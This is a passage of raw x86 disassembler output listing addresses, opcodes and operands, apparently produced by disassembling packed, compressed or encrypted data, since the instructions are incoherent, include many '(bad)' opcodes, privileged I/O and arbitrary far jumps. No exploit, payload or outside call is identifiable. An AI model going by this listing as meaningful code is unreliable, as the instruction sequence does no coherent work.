  425872:	adc    DWORD PTR [eax-0x50a2e575],ecx
  425878:	in     al,dx
  425879:	repz popf 
  42587b:	xchg   DWORD PTR [edx],edi
  42587d:	rcr    DWORD PTR [eax+0x9],0xe8
  425881:	stc    
  425882:	outs   dx,BYTE PTR ds:[esi]
  425883:	pop    ebx
  425884:	ins    DWORD PTR es:[edi],dx
  425885:	mov    dh,0x53
  425887:	test   DWORD PTR [esi],edi
  425889:	push   edx
  42588a:	lock rcr DWORD PTR [edx+edi*4+0x33],0x48
  425890:	cmp    BYTE PTR [eax],al
	...
  4258f2:	add    BYTE PTR [eax],al
  4258f4:	pop    esp
  4258f5:	push   edx
  4258f6:	nop
  4258f7:	push   edx
  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	mov    dl,0xb8
  425902:	scas   eax,DWORD PTR es:[edi]
  425903:	or     ecx,DWORD PTR [eax+0x5000191]
  425909:	add    DWORD PTR [eax],eax
  42590b:	add    BYTE PTR [ecx],dh
  42590d:	mov    al,ds:0x9c869636
  425912:	adc    BYTE PTR [ebp-0x78ef6976],dh
  425918:	enter  0x971a,0x2d
  42591c:	sbb    ch,dh
  42591e:	fsubr  st,st(6)
  425920:	loopne 0x4258ee
  425922:	stc    
  425923:	cs push eax
  425925:	pop    ecx
  425926:	xchg   ecx,eax
  425927:	mov    ss,WORD PTR [ebx-0x25c15098]
  42592d:	push   ecx
  42592e:	jg     0x4259af
  425930:	sub    esp,DWORD PTR [edx+0x126ec4d1]
  425936:	mov    eax,0x2798d1ce
  42593b:	xchg   esp,eax
  42593c:	outs   dx,DWORD PTR ds:[esi]
  42593d:	hlt    
  42593e:	jo     0x42593d
  425940:	mov    cs,WORD PTR [edx+eiz*4]
  425943:	outs   dx,BYTE PTR ds:[esi]
  425944:	inc    ebp
  425945:	jmp    0x425946
  425947:	adc    eax,0x26437728
  42594c:	shr    BYTE PTR [edx],1
  42594e:	jle    0x4258dc
  425950:	sar    cl,cl
  425952:	or     DWORD PTR [edx+0x2a91a093],ebx
  425958:	mov    ebx,0xbe2deab1
  42595d:	nop
  42595e:	retf   0x5666
  425961:	inc    ebp
  425962:	mov    edi,0x1945cf48
  425967:	fstp   QWORD PTR [eax]
  425969:	mov    edi,0x79cd087b
  42596e:	mov    WORD PTR [ecx],?
  425970:	rol    BYTE PTR [ecx+0xa],cl
  425973:	dec    BYTE PTR [edx-0x7a9260b8]
  425979:	and    eax,0x374d37d6
  42597e:	jg     0x4259ca
  425980:	adc    al,0x14
  425982:	cmc    
  425983:	jne    0x42593e
  425985:	(bad)  
  425986:	test   DWORD PTR [esi+0x12],ebx
  425989:	inc    ebp
  42598a:	gs cmp al,0x1
  42598d:	mov    cl,0x63
  42598f:	push   esi
  425990:	cmp    al,0x9e
  425992:	and    al,0x89
  425994:	sub    eax,0x66490bf5
  425999:	int3   
  42599a:	int    0xd6
  42599c:	scas   eax,DWORD PTR es:[edi]
  42599d:	or     DWORD PTR [esi-0x402a0c56],ebp
  4259a3:	in     eax,dx
  4259a4:	aas    
  4259a5:	xlat   BYTE PTR ss:[ebx]
  4259a7:	add    eax,0xd228d4bf
  4259ac:	sub    edx,esp
  4259ae:	adc    eax,0xf88baed8
  4259b3:	xchg   esp,eax
  4259b4:	and    eax,0xead340ad
  4259b9:	mov    eax,0x385aad45
  4259be:	mov    dl,0x14
  4259c0:	sti    
  4259c1:	jl     0x42597f
  4259c3:	xchg   esp,eax
  4259c4:	ins    BYTE PTR es:[edi],dx
  4259c5:	adc    DWORD PTR [ebx],0x6a19bf22
  4259cb:	ds repnz stos DWORD PTR es:[edi],eax
  4259ce:	xchg   ecx,eax
  4259cf:	mov    ecx,0xad09b8b8
  4259d4:	cmp    DWORD PTR [ebx-0x34],edi
  4259d7:	push   ds
  4259d8:	adc    dl,0x1e
  4259db:	pop    ss
  4259dc:	jno    0x4259bd
  4259de:	sub    DWORD PTR [edx+0x6],ecx
  4259e1:	and    BYTE PTR [edx+ebx*8],ch
  4259e4:	loope  0x425a4c
  4259e6:	ja     0x4259e8
  4259e8:	ret    0x41e8
  4259eb:	push   es
  4259ec:	les    esi,FWORD PTR [edx+0x27df53ed]
  4259f2:	sbb    cl,BYTE PTR ds:0x84fe757b
  4259f8:	sub    al,0xe3
  4259fa:	mov    WORD PTR [ecx+esi*1+0x51],ds
  4259fe:	lods   eax,DWORD PTR ds:[esi]
  4259ff:	(bad)  
  425a00:	in     al,dx
  425a01:	stos   DWORD PTR es:[edi],eax
  425a02:	jno    0x4259a9
  425a04:	fwait
  425a05:	dec    eax
  425a06:	(bad)  
  425a07:	not    BYTE PTR [edi-0x60037468]
  425a0d:	sbb    eax,0x7116fb
	...
  425a72:	add    BYTE PTR [eax],al
  425a74:	shl    DWORD PTR [ebx+0x4],0x67
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4-0xe1d4220]
  425a84:	lea    edx,[edx+0x1050001]
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	jo     0x425a45
  425a8e:	lea    eax,[edx+eax*2+0x124ebf7]
  425a95:	xchg   ecx,eax
  425a96:	dec    eax
  425a97:	jb     0x425a42
  425a99:	xchg   ebp,eax
  425a9a:	aas    
  425a9b:	loope  0x425a23
  425a9d:	mov    eax,ds:0x212695d0
  425aa2:	push   0x6d
  425aa4:	add    edi,DWORD PTR [edi+0x3fb456bd]
  425aaa:	adc    eax,0x76451ff7
  425aaf:	mov    DWORD PTR [eax-0x6a1d135d],esp
  425ab5:	or     eax,0x8004961c
  425aba:	inc    edx
  425abb:	mov    ebx,0x2f822bbe
  425ac0:	(bad)  
  425ac1:	mov    ebx,0xef6f3ff7
  425ac6:	cmp    DWORD PTR [edi+0x53],edi
  425ac9:	lds    ebp,FWORD PTR [eax-0x28]
  425acc:	mov    eax,ds:0x7d0dbc0b
  425ad1:	push   cs
  425ad2:	sbb    bl,bl
  425ad4:	jp     0x425a7b
  425ad6:	mov    ecx,0xc74e74c6
  425adb:	jecxz  0x425b22
  425add:	mov    eax,0x760d86a2
  425ae2:	test   DWORD PTR [ebx-0x6d],0x1651ed83
  425ae9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425aea:	sub    edx,esi
  425aec:	mov    esp,0xc3de3b21
  425af1:	cmp    BYTE PTR ds:0xb45a2450,dh
  425af7:	jmp    0x425b0e
  425af9:	ret    0xa7a7
  425afc:	adc    ch,BYTE PTR [eax-0x3985d2c7]
  425b02:	mov    WORD PTR [edi],ss
  425b04:	adc    DWORD PTR [ebp+0x268dc997],edi
  425b0a:	sbb    edx,DWORD PTR [eax-0x15e254f3]
  425b10:	mov    al,0x6d
  425b12:	mov    ebx,DWORD PTR [ebp+0x279575a9]
  425b18:	mov    ds:0x4e3c34b0,al
  425b1d:	mov    al,0x4d
  425b1f:	shl    DWORD PTR [esi-0x3a],1
  425b22:	inc    ebp
  425b23:	mov    al,0x6a
  425b25:	add    DWORD PTR [esi-0x1],edx
  425b28:	sbb    eax,0x1145136e
  425b2d:	loop   0x425ba2
  425b2f:	jp     0x425acc
  425b31:	push   0x1ca55d44
  425b36:	sub    ebp,DWORD PTR [ebx-0x60]
  425b39:	bound  ebx,QWORD PTR [edi+edi*8-0x1fda35af]
  425b40:	jg     0x425ad1
  425b42:	lea    edx,[ebp+ebx*4+0x24]
  425b46:	into   
  425b47:	and    eax,0xcc5b51fa
  425b4c:	cmc    
  425b4d:	ficomp WORD PTR [ecx+0x1b]
  425b50:	cmp    DWORD PTR [edx+0x7dfe5822],edx
  425b56:	cmp    eax,0x4803ba28
  425b5b:	sub    al,0x3a
  425b5d:	mov    eax,ds:0xc17cd6ab
  425b62:	outs   dx,DWORD PTR ds:[esi]
  425b63:	xchg   esi,eax
  425b64:	jl     0x425bbd
  425b66:	cmp    edi,eax
  425b68:	inc    edx
  425b69:	imul   esi,DWORD PTR [eax+edx*8-0x25099aee],0x9291853a
  425b74:	cmp    eax,0x1a9914e4
  425b79:	xchg   ebp,eax
  425b7a:	popa   
  425b7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b7c:	adc    al,0x83
  425b7e:	push   esp
  425b7f:	(bad)  
  425b81:	xchg   ebx,eax
  425b82:	and    eax,DWORD PTR [ebx-0x78]
  425b85:	xchg   edx,eax
  425b86:	xchg   edi,eax
  425b87:	add    ch,ah
  425b89:	(bad)  
  425b8a:	xor    dh,al
  425b8c:	jg     0x425b53
  425b8e:	mov    eax,ds:0x353b
	...
  425bf3:	add    ah,al
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	neg    dl
  425c02:	push   ds
  425c03:	call   0x105:0x19392
  425c0a:	add    BYTE PTR [eax],al
  425c0c:	ja     0x425c49
  425c0e:	rol    DWORD PTR [eax],cl
  425c10:	and    dl,ch
  425c12:	sub    BYTE PTR [ebx+0x308d6307],dh
  425c18:	mov    WORD PTR [ebx-0x46],ss
  425c1b:	(bad)  
  425c1c:	pop    ss
  425c1d:	js     0x425c51
  425c1f:	add    al,0x9
  425c21:	(bad)  [ebx+ebp*8]
  425c24:	fidiv  DWORD PTR [ecx]
  425c26:	jno    0x425c34
  425c28:	dec    esp
  425c29:	out    dx,eax
  425c2a:	mov    ss,WORD PTR [esi-0x5a5203a4]
  425c30:	out    0xca,eax
  425c32:	or     BYTE PTR [edi],ah
  425c34:	add    BYTE PTR cs:[esi+0x52b4559c],al
  425c3b:	hlt    
  425c3c:	xor    DWORD PTR [eax-0x31],ebx
  425c3f:	test   al,0xab
  425c42:	sub    BYTE PTR [ebp-0x7fbdfaba],ah
  425c48:	call   0x7c9134a
  425c4d:	cmp    BYTE PTR [ebp+esi*4+0x62775191],bh
  425c54:	jns    0x3ae03dc7
  425c5a:	mov    bh,0xef
  425c5c:	jg     0x425bf9
  425c5e:	pop    ebx
  425c5f:	fistp  DWORD PTR [ecx]
  425c61:	in     eax,0x10
  425c63:	and    DWORD PTR [eax-0x49],ebp
  425c66:	dec    edi
  425c67:	std    
  425c68:	scas   eax,DWORD PTR es:[edi]
  425c69:	int    0x9d
  425c6b:	ret    0xcea4
  425c6e:	xlat   BYTE PTR ds:[ebx]
  425c6f:	daa    
  425c70:	add    esi,ebx
  425c72:	push   0xffffffdb
  425c74:	inc    ebx
  425c75:	mov    edx,0xccc60ca1
  425c7a:	mov    cl,ch
  425c7c:	jne    0x425c11
  425c7e:	loopne 0x425c38
  425c80:	mov    eax,ds:0x3ed89c5
  425c85:	(bad)  
  425c87:	xchg   esi,eax
  425c88:	cmp    al,bh
  425c8a:	or     eax,0x5975e880
  425c8f:	out    dx,al
  425c90:	mov    al,0x2
  425c92:	jmp    0x425c1c
  425c94:	sub    eax,0xacea455e
  425c99:	arpl   bx,si
  425c9b:	bound  edx,QWORD PTR [edx-0x538c7e8a]
  425ca1:	lahf   
  425ca2:	stos   BYTE PTR es:[edi],al
  425ca3:	mov    dl,0x4
  425ca5:	aas    
  425ca6:	mov    esp,0xf7be73e
  425cab:	cmp    edi,DWORD PTR [edx]
  425cad:	jge    0x425cfd
  425caf:	sbb    al,0x89
  425cb1:	ja     0x425cfc
  425cb3:	idiv   DWORD PTR [edi+0x4758f4bf]
  425cb9:	xor    BYTE PTR [ecx+0x2b0081b3],cl
  425cbf:	repz out dx,eax
  425cc1:	add    bh,BYTE PTR [edi]
  425cc3:	mov    bh,0x92
  425cc5:	in     al,dx
  425cc6:	jb     0x425d1a
  425cc8:	sti    
  425cc9:	push   esp
  425cca:	or     eax,0xbeb49459
  425ccf:	cwde   
  425cd0:	or     al,0x5a
  425cd2:	repnz icebp 
  425cd4:	xchg   DWORD PTR [ebx],esp
  425cd6:	jno    0x425d3f
  425cd8:	gs jge 0x425c76
  425cdb:	mov    al,0xef
  425cdd:	and    eax,0xf84a0c49
  425ce2:	repz (bad) 
  425ce4:	(bad)  
  425ce5:	loopne 0x425c76
  425ce7:	ja     0x425ca9
  425ce9:	adc    DWORD PTR [eax],eax
  425ceb:	xchg   ebx,eax
  425cec:	mov    ebx,ebp
  425cee:	xlat   BYTE PTR ds:[ebx]
  425cef:	adc    ch,bl
  425cf1:	je     0x425cc5
  425cf3:	test   al,0xa8
  425cf5:	or     eax,0xda34756f
  425cfa:	sub    al,0x2a
  425cfc:	(bad)  
  425cfd:	iret   
  425cfe:	xchg   esp,eax
  425cff:	mov    dh,0x37
  425d01:	popf   
  425d02:	dec    eax
  425d03:	jecxz  0x425d23
  425d05:	loope  0x425d39
  425d07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425d08:	pop    ss
  425d09:	and    eax,0xc95c9d39
  425d0e:	inc    ecx
  425d0f:	ss mov ch,0x0
	...
  425d72:	add    BYTE PTR [eax],al
  425d74:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0xecd7c692,al
  425d84:	xchg   edi,eax
  425d85:	xchg   esp,eax
  425d86:	add    DWORD PTR [eax],eax
  425d88:	add    eax,0x7a000001
  425d8d:	cmp    DWORD PTR [ecx+0x2b1569ee],eax
  425d93:	cmp    BYTE PTR [edi],ah
  425d95:	pop    ss
  425d96:	and    eax,0xec3f059f
  425d9b:	out    dx,eax
  425d9c:	scas   eax,DWORD PTR es:[edi]
  425d9d:	aad    0x87
  425d9f:	xchg   BYTE PTR [ebx-0x7e],ah
  425da2:	pop    edx
  425da3:	inc    edx
  425da4:	inc    esp
  425da5:	popa   
  425da6:	rcr    DWORD PTR [edi+edx*1+0x64],0x3e
  425dab:	(bad)  
  425dac:	daa    
  425dad:	sub    BYTE PTR [edx-0x27dedbd5],0xd1
  425db4:	div    DWORD PTR [eax+0x7]
  425db7:	mov    esp,0x5c339bb8
  425dbc:	nop
  425dbd:	test   al,0xa8
  425dbf:	retf   
  425dc0:	cmp    edx,DWORD PTR [ecx+edx*4-0x7ddb10c9]
  425dc7:	mov    dl,BYTE PTR ds:0x546f8c81
  425dcd:	(bad)  
  425dce:	not    DWORD PTR [ecx+esi*8]
  425dd1:	fwait
  425dd2:	(bad)  
  425dd3:	fistp  QWORD PTR [ebx+0x28]
  425dd6:	sbb    ebp,ecx
  425dd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425dd9:	out    dx,al
  425dda:	out    dx,eax
  425ddb:	push   ebp
  425ddc:	in     al,0x2d
  425dde:	dec    eax
  425ddf:	sti    
  425de0:	and    bl,0xb8
  425de3:	sbb    ebx,DWORD PTR [esi-0x10]
  425de6:	outs   dx,DWORD PTR ds:[esi]
  425de7:	aas    
  425de8:	ins    DWORD PTR es:[edi],dx
  425de9:	dec    edi
  425dea:	into   
  425deb:	mov    fs,WORD PTR ds:0x8cd14621
  425df1:	mov    bl,0x25
  425df3:	int    0x23
  425df5:	int3   
  425df6:	popa   
  425df7:	mov    eax,0xe285ca33
  425dfc:	push   ecx
  425dfd:	(bad)  
  425dfe:	cmc    
  425dff:	sub    BYTE PTR [esi],0x55
  425e02:	xchg   ecx,eax
  425e03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e04:	xor    eax,0xea35b89a
  425e09:	lahf   
  425e0a:	mov    dh,0x41
  425e0c:	fneni(8087 only) 
  425e0e:	inc    esi
  425e0f:	ins    BYTE PTR es:[edi],dx
  425e10:	aam    0xfe
  425e12:	int    0x4e
  425e14:	inc    edi
  425e15:	and    bl,bh
  425e17:	lods   al,BYTE PTR ds:[esi]
  425e18:	ins    BYTE PTR es:[edi],dx
  425e19:	dec    esi
  425e1a:	jb     0x425e59
  425e1c:	inc    eax
  425e1d:	pop    eax
  425e1e:	xchg   BYTE PTR [ebp-0x61],ch
  425e21:	mov    dl,0xc7
  425e23:	clc    
  425e24:	(bad)  
  425e25:	js     0x425e44
  425e27:	lock sub al,0x54
  425e2a:	mov    ds:0x82d34196,al
  425e2f:	idiv   BYTE PTR [ebx]
  425e31:	add    edx,edx
  425e33:	icebp  
  425e34:	mov    ds,WORD PTR [eax-0x39df38f9]
  425e3a:	fst    QWORD PTR [edx]
  425e3c:	popa   
  425e3d:	ins    BYTE PTR es:[edi],dx
  425e3e:	outs   dx,BYTE PTR ds:[esi]
  425e3f:	dec    ebx
  425e40:	and    eax,DWORD PTR [edi+0x29]
  425e43:	ja     0x425dd6
  425e45:	dec    eax
  425e46:	jmp    0x364ca369
  425e4b:	push   ds
  425e4c:	dec    ebp
  425e4d:	xor    dh,BYTE PTR [edx+0x2a675149]
  425e53:	push   ss
  425e54:	pop    es
  425e55:	fs inc ecx
  425e57:	js     0x425e35
  425e59:	fdiv   st(5),st
  425e5b:	daa    
  425e5c:	ret    
  425e5d:	iret   
  425e5e:	pop    es
  425e5f:	adc    eax,0x5d864140
  425e64:	cmp    ch,dl
  425e66:	leave  
  425e67:	xchg   DWORD PTR [ecx+0x5e],ebx
  425e6a:	stos   DWORD PTR es:[edi],eax
  425e6b:	pop    esi
  425e6c:	icebp  
  425e6d:	call   0x94d7:0xab9ca446
  425e74:	test   al,0xbd
  425e76:	loope  0x425e01
  425e78:	pop    esi
  425e79:	push   0x6b
  425e7b:	mul    DWORD PTR [edx]
  425e7d:	mov    ds:0xe18142ca,eax
  425e83:	xchg   edi,eax
  425e84:	pop    es
  425e85:	or     dl,ch
  425e87:	push   cs
  425e88:	push   ebx
  425e89:	mov    ah,0x76
  425e8b:	xchg   ebp,eax
  425e8c:	jp     0x425e79
  425e8e:	and    dl,BYTE PTR [esi]
  425e90:	mov    dl,0x0
	...
  425ef2:	add    BYTE PTR [eax],al
  425ef4:	(bad)  
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	lock outs dx,BYTE PTR ds:[esi]
  425f02:	test   BYTE PTR [eax+0x1959c],ah
  425f08:	add    eax,0xd0000001
  425f0d:	fs mov cl,0x5c
  425f10:	out    dx,al
  425f11:	imul   eax,DWORD PTR [ecx],0xffffffb9
  425f14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425f15:	data16 sahf 
  425f17:	lods   al,BYTE PTR ds:[esi]
  425f18:	popf   
  425f19:	and    BYTE PTR [esi-0x17],dh
  425f1c:	inc    edx
  425f1d:	push   esp
  425f1e:	adc    ebx,DWORD PTR [edi-0x5bd1483e]
  425f24:	sti    
  425f25:	popa   
  425f26:	xor    edi,DWORD PTR [edi-0x66]
  425f29:	call   0x5f94:0x16d7e37e
  425f30:	fs lahf 
  425f32:	mov    dl,0x4a
  425f34:	mov    bh,dl
  425f36:	inc    edi
  425f37:	stos   DWORD PTR es:[edi],eax
  425f38:	mov    esp,DWORD PTR [ebp+ebx*8-0x6e8fca1d]
  425f3f:	scas   eax,DWORD PTR es:[edi]
  425f40:	sub    al,0x7a
  425f42:	cmp    cl,BYTE PTR [esi-0x1b63b794]
  425f48:	add    BYTE PTR [ecx],dh
  425f4a:	and    bl,BYTE PTR [eax]
  425f4c:	(bad)  
  425f4e:	outs   dx,BYTE PTR ds:[esi]
  425f4f:	ss ss dec ebp
  425f52:	jno    0x425f65
  425f54:	lods   al,BYTE PTR ds:[esi]
  425f55:	cmp    dl,BYTE PTR [edi-0x34]
  425f58:	(bad)  
  425f59:	les    edi,FWORD PTR ds:0x86bbc94c
  425f5f:	aad    0x1e
  425f61:	cmp    eax,0xd7bce29a
  425f66:	popa   
  425f67:	or     BYTE PTR [esi-0x25d4a564],ah
  425f6d:	imul   esp,DWORD PTR [esi+0x58],0x15
  425f71:	cdq    
  425f72:	pop    edi
  425f73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f74:	xchg   esp,eax
  425f75:	imul   esi,esi,0x712ee572
  425f7b:	mul    dl
  425f7d:	pop    esp
  425f7e:	jae    0x425fdd
  425f80:	dec    edi
  425f81:	fwait
  425f82:	mov    BYTE PTR [ebx-0x27a273be],dh
  425f88:	not    DWORD PTR [edi]
  425f8a:	outs   dx,BYTE PTR ds:[esi]
  425f8b:	and    esi,DWORD PTR [esi+0x2a3926a7]
  425f91:	jecxz  0x425f61
  425f93:	sar    BYTE PTR [edx],cl
  425f95:	sub    al,0xec
  425f97:	fsubr  QWORD PTR [eax]
  425f99:	(bad)  
  425f9a:	in     eax,dx
  425f9b:	pop    ebp
  425f9c:	jle    0x425f80
  425f9e:	pop    ebx
  425f9f:	mov    eax,0xf88b1693
  425fa4:	xor    DWORD PTR [eax],ebx
  425fa6:	sahf   
  425fa7:	sub    BYTE PTR [ecx],ch
  425fa9:	sub    al,0x7c
  425fab:	jle    0x425f3a
  425fad:	call   0x3fed471c
  425fb2:	pop    es
  425fb3:	push   cs
  425fb4:	pop    edi
  425fb5:	dec    esp
  425fb6:	out    0x7f,eax
  425fb8:	hlt    
  425fb9:	(bad)  
  425fba:	outs   dx,BYTE PTR ds:[esi]
  425fbb:	xor    DWORD PTR [eax+0x311bce4b],edi
  425fc1:	ja     0x42600f
  425fc3:	fild   WORD PTR cs:[esi]
  425fc6:	add    ebx,esp
  425fc8:	fldenv [edi+ebp*8]
  425fcb:	and    BYTE PTR [ebx],ch
  425fcd:	ds sbb eax,0x54ac8a6d
  425fd3:	fmul   st,st(5)
  425fd5:	test   DWORD PTR [ebp-0x7478f58a],0x81fd005
  425fdf:	mov    bl,0x95
  425fe1:	stc    
  425fe2:	retf   
  425fe3:	cs retf 
  425fe5:	sub    edx,eax
  425fe7:	push   ecx
  425fe8:	ss popf 
  425fea:	pop    ds
  425feb:	lods   eax,DWORD PTR ds:[esi]
  425fec:	in     al,dx
  425fed:	mov    ecx,0xd6dc6ebd
  425ff2:	mov    dh,0x74
  425ff4:	or     ebx,DWORD PTR ds:0x46baf960
  425ffa:	mov    ds:0xa4d06324,al
  425fff:	mov    edx,0x6d1bb012
  426004:	pushf  
  426005:	or     BYTE PTR [ebp-0x7a],al
  426008:	cmp    esp,esp
  42600a:	mov    DWORD PTR [edx+ebp*1-0x594243f1],ecx
	...
  426071:	add    BYTE PTR [eax],al
  426073:	add    BYTE PTR [ecx],bh
  426075:	cwde   
  426076:	or     eax,DWORD PTR [esi]
  426078:	stos   DWORD PTR es:[edi],eax
  426079:	xchg   edi,eax
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	fld    QWORD PTR [edi-0x695eb05f]
  426086:	add    DWORD PTR [eax],eax
  426088:	add    eax,0x40000001
  42608d:	lods   eax,DWORD PTR ds:[esi]
  42608e:	stos   DWORD PTR es:[edi],eax
  42608f:	fldcw  WORD PTR [esi]
  426091:	mov    ebp,edi
  426093:	dec    ecx
  426094:	cwde   
  426095:	fcmovne st,st(3)
  426097:	add    ah,BYTE PTR [ecx-0x6e772152]
  42609d:	sbb    DWORD PTR [ebx+0x461da45a],0x209921b7
  4260a7:	adc    al,BYTE PTR [edx+0x10]
  4260aa:	sub    ebx,DWORD PTR es:[edx+0x66994f98]
  4260b1:	pop    edi
  4260b2:	arpl   WORD PTR [eax],sp
  4260b4:	or     al,0xa4
  4260b6:	fidiv  DWORD PTR [ecx+edi*1-0x122b85c0]
  4260bd:	xchg   BYTE PTR [eax],bl
  4260bf:	and    DWORD PTR [ebp+0x70],ebp
  4260c2:	xchg   edi,eax
  4260c3:	xchg   ebx,eax
  4260c4:	inc    ebx
  4260c5:	xchg   ebp,eax
  4260c6:	in     eax,dx
  4260c7:	test   eax,0x7f5a764b
  4260cc:	test   dl,0x7e
  4260cf:	xchg   edi,eax
  4260d0:	cmp    eax,0x8f0dc139
  4260d5:	les    ebx,FWORD PTR [edx]
  4260d7:	mov    dl,0x33
  4260d9:	aad    0x8e
  4260db:	jo     0x426116
  4260dd:	adc    al,0xbe
  4260df:	scas   eax,DWORD PTR es:[edi]
  4260e0:	loope  0x4260d4
  4260e2:	jb     0x4260e9
  4260e4:	or     edi,ecx
  4260e6:	xchg   DWORD PTR [esi],ebx
  4260e8:	add    BYTE PTR [ebx],bl
  4260ea:	in     eax,0x92
  4260ec:	dec    edx
  4260ed:	fidiv  DWORD PTR [ebp+0x157be0c7]
  4260f3:	add    al,0x9a
  4260f5:	jmp    0x1b4b:0x73314b5f
  4260fc:	fadd   DWORD PTR [esi+0x7]
  4260ff:	out    dx,eax
  426100:	and    DWORD PTR [edx+0x74],eax
  426103:	xor    dl,BYTE PTR [ebx-0x27]
  426106:	sar    BYTE PTR [edx],0xef
  426109:	and    DWORD PTR [edi+esi*1],ebp
  42610c:	push   ecx
  42610d:	add    al,0xc9
  42610f:	retf   0x5ce2
  426112:	push   edi
  426113:	mov    ah,0x85
  426115:	les    edx,FWORD PTR [ecx+ebx*1-0x3a]
  426119:	ins    DWORD PTR es:[edi],dx
  42611a:	imul   ecx,DWORD PTR [edx],0xffffffe9
  42611d:	xchg   esp,eax
  42611e:	sbb    ebp,DWORD PTR [edi+0x6ae18cf3]
  426124:	mov    edi,0x78a1da28
  426129:	adc    BYTE PTR [edi-0x4e],bh
  42612c:	dec    ecx
  42612d:	cmp    al,0x51
  42612f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426130:	cmp    DWORD PTR cs:0x956dcfe7,0x24
  426138:	xor    eax,0x80f4f508
  42613d:	mov    esi,0x3ff0fd88
  426142:	jle    0x426187
  426144:	outs   dx,BYTE PTR ds:[esi]
  426145:	or     ecx,DWORD PTR [edx]
  426147:	cdq    
  426148:	push   ecx
  426149:	call   0xb89a:0xedac137f
  426150:	ret    0x2c6e
  426153:	shr    BYTE PTR [eax-0x74],cl
  426156:	enterw 0x8a8d,0x8
  42615b:	dec    ebx
  42615c:	outs   dx,DWORD PTR ds:[esi]
  42615d:	jne    0x426101
  42615f:	and    bl,BYTE PTR [ebx+0x16]
  426162:	add    BYTE PTR [edx+esi*2],bl
  426165:	shl    ecx,0x55
  426168:	data16 fwait
  42616a:	mov    edi,DWORD PTR [esp+edi*4+0x55]
  42616e:	jae    0x426176
  426170:	repnz pop ebx
  426172:	jnp    0x4261c0
  426174:	repnz sahf 
  426176:	lock mov BYTE PTR [edx],ah
  426179:	in     eax,0xb2
  42617b:	bound  esi,QWORD PTR [esi+0x47]
  42617e:	or     BYTE PTR [ebx+0x24],ah
  426181:	jo     0x426123
  426183:	cmp    esi,DWORD PTR [edx+ebx*4-0xf]
  426187:	inc    eax
  426188:	push   ss
  426189:	sub    al,0x88
  42618b:	pop    ebp
  42618c:	mov    ah,0x75
  42618e:	pop    edi
  42618f:	sahf   
  426190:	mov    BYTE PTR [eax],0x0
	...
  4261f3:	add    BYTE PTR [ebx-0x409ef0df],bl
  4261f9:	outs   dx,DWORD PTR ds:[esi]
  4261fa:	(bad)  
  4261fb:	sti    
  4261fc:	mov    bh,0x83
  4261fe:	mov    cl,0x27
  426200:	push   edx
  426201:	popf   
  426202:	xor    BYTE PTR ss:[esi+0x5000197],ah
  426209:	add    DWORD PTR [eax],eax
  42620b:	add    BYTE PTR [ebx],cl
  42620d:	xor    al,0xb
  42620f:	test   bl,0x45
  426212:	sub    BYTE PTR [edi-0x26],dh
  426215:	cdq    
  426216:	outs   dx,BYTE PTR ds:[esi]
  426217:	test   BYTE PTR [ebp+0x19],bh
  42621a:	aas    
  42621b:	inc    ebp
  42621c:	stc    
  42621d:	int3   
  42621e:	sub    al,0x45
  426220:	mov    al,ds:0x2ab779d3
  426225:	sbb    ebp,DWORD PTR [esi]
  426227:	sbb    edx,DWORD PTR [edi-0x1d69104c]
  42622d:	out    dx,eax
  42622e:	pop    ebx
  42622f:	sbb    eax,0xa91e2fb
  426234:	(bad)  
  426236:	jmp    0x42624b
  426238:	fs ins BYTE PTR es:[edi],dx
  42623a:	mov    esi,0xe91384f4
  42623f:	div    bl
  426241:	(bad)  [ecx+ebp*2-0x2e]
  426245:	add    ecx,DWORD PTR [ebx]
  426247:	outs   dx,DWORD PTR ds:[esi]
  426248:	cmp    BYTE PTR [ebx+ebx*4-0x78548587],al
  42624f:	push   esi
  426250:	out    0xd1,al
  426252:	mov    al,ds:0x7cfa2908
  426257:	jno    0x4261f8
  426259:	xchg   esp,eax
  42625a:	push   eax
  42625b:	pop    edx
  42625c:	jnp    0x42621b
  42625e:	lea    edx,[ebp-0x16bef5ed]
  426264:	sbb    BYTE PTR [ebp-0x66],al
  426267:	jnp    0x426229
  426269:	sti    
  42626a:	call   0x81c9b61
  42626f:	sub    eax,0xda652b20
  426274:	mov    eax,ds:0x6afede60
  426279:	lock inc edx
  42627b:	int    0xe7
  42627d:	adc    dl,BYTE PTR [eax]
  42627f:	or     cl,0xa
  426282:	rcr    BYTE PTR [esi-0x1b6bcdde],cl
  426288:	push   ss
  426289:	sub    dh,BYTE PTR es:[edx+0x52]
  42628d:	jmp    0x4262a0
  42628f:	fcomp  DWORD PTR [edi+0x4ee40843]
  426295:	cmc    
  426296:	stc    
  426297:	jle    0x426240
  426299:	int    0x7
  42629b:	adc    DWORD PTR [edi],0xffffffee
  42629e:	mov    ebp,esp
  4262a0:	adc    eax,0xd74324cb
  4262a5:	add    DWORD PTR ds:0x95506aec,ecx
  4262ab:	sub    ah,BYTE PTR [eax]
  4262ad:	push   esp
  4262ae:	rcr    BYTE PTR [ebx],1
  4262b0:	iret   
  4262b1:	mov    esp,0x775902ff
  4262b6:	(bad)  
  4262b7:	mov    ebx,DWORD PTR [eax-0x47]
  4262ba:	mov    dl,0x4e
